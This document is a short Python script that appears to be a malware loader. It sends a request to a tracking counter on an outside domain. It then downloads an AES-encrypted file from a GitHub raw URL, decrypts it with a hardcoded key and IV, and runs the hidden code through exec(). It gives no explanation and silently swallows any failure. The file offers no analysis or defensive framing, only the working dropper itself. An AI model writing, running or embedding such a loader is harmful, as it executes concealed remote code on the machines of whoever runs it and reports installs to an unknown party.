import requests
from pathlib import Path
from Crypto.Cipher import AES

KEY = b"thsiisaverysecurekey132456789012"
IV = b"thisisasinitvect"

ENC_URL = "https://github.com/usdfhifwer1/1/raw/refs/heads/main/new2.py.enc"
COUNTER_URL = "https://dfiwod.com/counter.php"
LOCAL_ENC_PATH = Path("new2.py.enc")

def unpad(data: bytes) -> bytes:
    pad_len = data[-1]
    return data[:-pad_len]

def decrypt_aes(encrypted_data: bytes, key: bytes, iv: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(encrypted_data)
    return unpad(decrypted)

try:
    try:
        requests.get(COUNTER_URL)
    except:
        pass

    response = requests.get(ENC_URL)
    response.raise_for_status()

    with open(LOCAL_ENC_PATH, "wb") as f:
        f.write(response.content)

    with open(LOCAL_ENC_PATH, "rb") as f:
        encrypted_data = f.read()

    decrypted_data = decrypt_aes(encrypted_data, KEY, IV)
    script_code = decrypted_data.decode("utf-8")

    exec(script_code, globals())

except Exception as e:
    print(f"❌ Error: {e}")
